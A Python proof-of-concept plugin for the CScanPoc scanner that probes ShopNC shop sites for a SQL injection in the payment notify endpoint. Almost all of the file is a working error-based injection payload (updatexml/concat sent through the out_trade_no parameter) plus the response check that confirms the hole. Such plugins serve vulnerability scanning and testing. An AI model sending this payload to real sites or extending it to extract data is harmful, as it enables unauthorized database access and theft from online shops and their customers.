# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'ShopNC_0003'  # 平台漏洞编号，留空
    name = 'ShopNC SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-07-09'  # 漏洞公布时间
    desc = '''
        ShopNC商城系统，是天津市网城天创科技有限责任公司开发的一套多店模式的商城系统。
        ShopNC SQL注入漏洞。
        /index.php?act=payment&op=notify
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0125517'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShopNC'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7029645a-d9f7-4d9b-9c9f-ab5329229419'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer:http://www.wooyun.org/bugs/wooyun-2010-0125517
            hh = hackhttp.hackhttp()
            arg = self.target
            post = 'out_trade_no%5B0%5D=exp&out_trade_no%5B1%5D=%20%201=1%20and%20(updatexml(1,concat(0x3a,(select%20md5(1))),1))'
            target = arg + '/index.php?act=payment&op=notify'
            code, head, res, errcode, _ = hh.http(target, post=post)

            if code == 200 and "c4ca4238a0b923820dcc509a6f75849" in res:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
